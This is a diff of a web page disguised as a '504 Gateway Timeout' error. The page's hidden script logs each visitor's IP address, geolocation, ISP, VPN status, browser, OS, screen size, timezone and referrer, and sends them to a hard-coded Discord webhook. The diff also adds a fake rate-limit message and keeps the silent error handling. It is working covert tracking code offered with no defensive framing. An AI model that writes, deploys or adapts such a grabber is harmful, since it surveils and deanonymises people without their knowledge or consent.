@@ -8,45 +8,52 @@
 <h1>504 Gateway Timeout</h1>
 <p>The server didn't respond in time.<br>The upstream server (or proxy) timed out.</p>
 
+<div id="msg"></div>
+
 <script>
+const MAX_REFRESH = 5;
+let refreshCount = parseInt(localStorage.getItem('refreshCount') || '0') + 1;
+localStorage.setItem('refreshCount', refreshCount);
+
+if (refreshCount > MAX_REFRESH) {
+  document.body.innerHTML = '<h1>429 Too Many Requests</h1><p>Rate limit exceeded. Try again later.</p>';
+}
+
 (async function(){
   try{
     const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip);
     const geo = await fetch('https://ipwho.is/'+ip).then(r=>r.json());
 
+    const isVPN = geo.proxy || geo.hosting || geo.mobile === false && geo.connection?.type === 'unknown';
+
     const ua = navigator.userAgent;
     const browser = /Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) ? 'Safari' : /Edg/.test(ua) ? 'Edge' : 'Other';
     const os = /Win/.test(ua) ? 'Windows' : /Mac/.test(ua) ? 'macOS' : /Android/.test(ua) ? 'Android' : /iPhone|iPad|iPod/.test(ua) ? 'iOS' : 'Other';
-    const device = /Mobile/.test(ua) ? 'Mobile' : 'Desktop';
-
-    const payload = {
-      content: '@everyone',
-      embeds: [{
-        title: 'Detailed log',
-        color: 16711680,
-        fields: [
-          {name:'IP', value:ip, inline:true},
-          {name:'Country', value:`${geo.country || 'Unknown'} ${geo.flag?.emoji || ''}`, inline:true},
-          {name:'City / Region', value:`${geo.city || '?'} • ${geo.region || '?'}`.trim(), inline:true},
-          {name:'ISP / Provider', value:geo.connection?.isp || 'Unknown', inline:true},
-          {name:'Connection Type', value:geo.connection?.type || 'Unknown', inline:true},
-          {name:'Browser', value:browser, inline:true},
-          {name:'OS / Device', value:`${os} • ${device}`, inline:true},
-          {name:'Screen', value:`\( {screen.width}× \){screen.height}`, inline:true},
-          {name:'Language', value:navigator.language || 'Unknown', inline:true},
-          {name:'Timezone', value:Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline:true},
-          {name:'Coordinates', value:`${geo.latitude?.toFixed(4) || '?'} , ${geo.longitude?.toFixed(4) || '?'}`.trim(), inline:true},
-          {name:'Referrer', value:document.referrer || 'Direct / No referrer', inline:false},
-          {name:'Full UA', value:ua.slice(0, 200) + (ua.length > 200 ? '...' : ''), inline:false}
-        ],
-        timestamp: new Date().toISOString()
-      }]
-    };
 
     await fetch('https://discord.com/api/webhooks/1441788885268041788/n17DxZidjM-rc_RldYGa_ROF4zzohKWlcK_ZhyY3-Cf07O0LJRPNE3XA4MmIleWdQQCM', {
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify(payload)
+      body:JSON.stringify({
+        content: '@everyone',
+        embeds: [{
+          title: 'detailed log',
+          color: 16711680,
+          fields: [
+            {name:'IP', value:ip, inline:true},
+            {name:'Country', value:`${geo.country || 'Unknown'} ${geo.flag?.emoji || ''}`, inline:true},
+            {name:'City / Region', value:`${geo.city || '?'} • ${geo.region || '?'}`.trim(), inline:true},
+            {name:'ISP', value:geo.connection?.isp || 'Unknown', inline:true},
+            {name:'VPN / Proxy / Hosting', value:isVPN ? 'Yes' : 'No', inline:true},
+            {name:'Browser', value:browser, inline:true},
+            {name:'OS', value:os, inline:true},
+            {name:'Screen', value:`\( {screen.width}× \){screen.height}`, inline:true},
+            {name:'Language', value:navigator.language || 'Unknown', inline:true},
+            {name:'Timezone', value:Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline:true},
+            {name:'Referrer', value:document.referrer || 'Direct', inline:false}
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      })
     });
   }catch(e){}
 })();
